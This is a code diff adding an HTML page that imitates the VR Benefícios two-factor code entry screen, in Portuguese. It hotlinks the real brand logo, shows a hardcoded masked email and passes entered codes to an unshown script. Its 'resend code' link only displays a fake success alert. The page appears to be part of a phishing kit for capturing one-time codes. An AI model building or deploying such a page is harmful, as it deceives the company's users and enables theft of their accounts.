@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VR - facilita a vida</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="content">
+    <section class="login-panel" aria-label="Acesso VR - Código 2FA">
+      <div class="login-box">
+        <header class="login-header">
+          <div class="logo-container">
+            <img class="logo" src="https://www.vr.com.br/sites/default/files/VR%20Benef%C3%ADcios.png" alt="VR Benefícios" style="height: 48px; width: auto;">
+          </div>
+          <h1>Informe os dados do seu Acesso VR para acessar os produtos.</h1>
+        </header>
+
+        <form class="login-form" id="codigo-form" aria-label="Formulário de código de segurança">
+          <!-- Card de usuário/e-mail mascarado -->
+          <div class="user-pill-card" id="user-pill-box" title="Alterar usuário" onclick="window.location.href='/'">
+            <span class="user-pill-text" id="masked-email">caro*********@gmai*****</span>
+            <span class="chevron-icon">&#8250;</span>
+          </div>
+
+          <!-- Campo de inserção de código 2FA -->
+          <div class="code-field-box">
+            <fieldset class="code-fieldset" id="code-fieldset">
+              <legend class="code-legend">Inserir o código*</legend>
+              <input id="codigo" name="codigo" type="text" autocomplete="one-time-code" inputmode="numeric" required maxlength="20" autofocus>
+            </fieldset>
+            <div class="error-msg" id="codigo-erro" style="display: none; color: #ef4444; font-size: 13px; font-weight: 600; margin-top: 8px; text-align: left; align-items: center; gap: 6px;">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+              <span>Código de verificação incorreto ou expirado. Tente novamente.</span>
+            </div>
+          </div>
+
+          <!-- Lembrar dispositivo -->
+          <label class="remember-device-row">
+            <input type="checkbox" id="lembrar-dispositivo" checked>
+            <span>Lembrar deste dispositivo por 30 dias</span>
+          </label>
+
+          <!-- Botão continuar -->
+          <button id="verificar" class="continue-button" type="submit" disabled>Continuar</button>
+          
+          <p class="submission-status" id="submission-status" role="status" aria-live="polite"></p>
+
+          <!-- Links de suporte e reenvio -->
+          <div class="mfa-footer-links">
+            <p class="resend-paragraph">Não recebeu um e-mail? <a href="#" id="reenviar-link" class="link-purple" onclick="alert('Código reenviado com sucesso para o e-mail cadastrado!'); return false;">Reenviar</a></p>
+            <p class="other-method-paragraph"><a href="#" id="outro-metodo-link" class="link-purple bold" onclick="window.location.href='/'; return false;">Tentar outro método</a></p>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <aside class="banner" aria-label="Comunicação VR"></aside>
+  </main>
+
+  <footer class="footer">
+    <span>© 2026 VR - Todos os direitos reservados</span>
+    <div class="help">
+      <span class="help-icon">?</span>
+      <a href="#ajuda-modal">Ajuda</a>
+    </div>
+  </footer>
+
+  <section id="ajuda-modal" class="help-modal" aria-label="Perguntas frequentes">
+    <div class="ajuda-dialog">
+      <a class="close-modal" href="#">×</a>
+      <div class="ajuda-header">
+        <p class="ajuda-title">Perguntas frequentes</p>
+        <p class="ajuda-subtitle">Clique na pergunta para ler as instruções que precisa</p>
+      </div>
+      <div class="ajuda-accordion">
+        <details><summary>Como informar o código?</summary><p>Digite o código recebido no seu e-mail e clique em “Continuar”.</p></details>
+        <details><summary>Não recebi meu código de verificação. O que fazer?</summary><p>Verifique sua caixa de spam ou a pasta de mensagens indesejadas do celular.</p></details>
+      </div>
+    </div>
+  </section>
+
+  <script src="codigo.js"></script>
+</body>
+</html>
